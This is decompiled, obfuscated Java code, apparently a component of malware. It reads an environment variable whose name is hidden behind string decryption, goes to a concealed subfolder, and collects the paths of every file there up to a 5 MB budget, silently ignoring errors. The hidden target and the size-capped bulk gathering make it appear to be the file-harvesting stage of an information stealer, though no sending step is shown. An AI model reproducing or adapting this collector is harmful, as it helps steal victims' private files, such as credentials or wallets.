/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public final class ai {
    public static b a() {
        try {
            Object object = System.getenv($S.d(212));
            if (object == null) {
                return null;
            }
            if (!((File)(object = new File((String)object + $S.d(840)))).exists()) {
                return null;
            }
            b b2 = new b();
            long[] lArray = new long[]{0L};
            File[] fileArray = ((File)object).listFiles();
            if (fileArray != null) {
                for (File file : fileArray) {
                    if (lArray[0] >= 0x500000L) break;
                    if (!file.isFile() || file.length() > 0x200000L || file.length() > 0x500000L - lArray[0]) continue;
                    String string = ((File)object).toPath().relativize(file.toPath()).toString().replace("\\", "/");
                    b2.b.add(new a(file.getAbsolutePath(), string));
                    lArray[0] = lArray[0] + file.length();
                }
            }
            if (b2.b.isEmpty()) {
                return null;
            }
            b2.a = true;
            return b2;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static final class b {
        public boolean a;
        public List<a> b = new ArrayList<a>();
    }

    public static final class a {
        public String a;
        public String b;

        public a(String string, String string2) {
            this.a = string;
            this.b = string2;
        }
    }
}

